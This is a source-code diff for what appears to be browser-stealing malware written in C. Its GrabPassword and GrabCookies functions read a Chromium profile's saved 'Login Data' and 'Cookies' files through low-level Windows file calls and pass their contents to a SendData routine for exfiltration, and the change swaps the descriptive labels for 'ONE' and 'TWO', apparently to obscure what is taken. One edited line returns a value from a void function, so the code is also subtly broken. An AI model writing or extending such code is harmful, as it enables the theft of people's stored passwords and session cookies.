@@ -1,3 +1,4 @@
+#include "../include/BrowserGrabber.h"
 #include "../include/MemoryUtils.h"
 #include "../include/StringUtils.h"
 #include "../include/SendData.h"
@@ -9,7 +10,6 @@ void GrabPassword(unsigned short *BrowserPath) {
     HANDLE              FileHandle          = {0};
     UNICODE_STRING      PathUnicode         = {0};
     OBJECT_ATTRIBUTES   PathObj             = {0};
-    IO_STATUS_BLOCK     IOstatus            = {0};
     char                FileSizeString[20]  = {0};
     unsigned char      *buffer              = {0};
     unsigned short      TempPath[250]       = {0};
@@ -22,27 +22,26 @@ void GrabPassword(unsigned short *BrowserPath) {
     ConcatStringW(TempPath, L"\\Default\\Login Data", PathSize);
 
     InitPathObj(TempPath, &PathObj, &PathUnicode);
-    InitFile(&FileHandle, FILE_READ_DATA | SYNCHRONIZE, &PathObj, &IOstatus, FILE_OPEN);
+    if (OpenFileY(&FileHandle, FILE_READ_DATA | SYNCHRONIZE, &PathObj, FILE_OPEN) != 0) {
+        return;
+    }
 
-    FileSize = FileSizeG(FileHandle, &IOstatus);
-    FullBufferSize = TotalBufferLength(L"Login Data", FileSize);
+    FileSize = GetFileSizeY(FileHandle);
+    FullBufferSize = TotalBufferLength(L"ONE", FileSize);
     
     buffer = AllocMemory(FullBufferSize);
     if (buffer == NULL) {
-        return;
+        return 1;
     }
 
     IntToString(FileSizeString, FileSize);
 
-    if (SendData(FileHandle, "Login Data", FileSize, FileSizeString, buffer, NULL, TRUE)) {
-        return;
-    }
+    SendData(FileHandle, "ONE", FileSize, FileSizeString, buffer, NULL, TRUE);
 }
 
 void GrabCookies(unsigned short *BrowserPath) {
     UNICODE_STRING      PathUnicode         = {0};
     OBJECT_ATTRIBUTES   PathObj             = {0};
-    IO_STATUS_BLOCK     IOstatus            = {0};
     HANDLE              FileHandle          = {0};
     char                FileSizeString[20]  = {0};
     unsigned char      *buffer              = {0};
@@ -56,10 +55,12 @@ void GrabCookies(unsigned short *BrowserPath) {
     ConcatStringW(TempPath, L"\\Default\\Network\\Cookies", PathSize);
 
     InitPathObj(TempPath, &PathObj, &PathUnicode);
-    InitFile(&FileHandle, FILE_READ_DATA | SYNCHRONIZE, &PathObj, &IOstatus, FILE_OPEN);
+    if (OpenFileY(&FileHandle, FILE_READ_DATA | SYNCHRONIZE, &PathObj, FILE_OPEN) != 0) {
+        return;
+    }
 
-    FileSize = FileSizeG(FileHandle, &IOstatus);
-    FullBufferSize = TotalBufferLength(L"Cookies", FileSize);
+    FileSize = GetFileSizeY(FileHandle);
+    FullBufferSize = TotalBufferLength(L"TWO", FileSize);
 
     buffer = AllocMemory((SIZE_T)FullBufferSize);
     if (buffer == NULL) {
@@ -68,7 +69,5 @@ void GrabCookies(unsigned short *BrowserPath) {
 
     IntToString(FileSizeString, FileSize);
 
-    if (SendData(FileHandle, "Cookies", FileSize, FileSizeString, buffer, NULL, TRUE)) {
-        return;
-    }
+    SendData(FileHandle, "TWO", FileSize, FileSizeString, buffer, NULL, TRUE);
 }
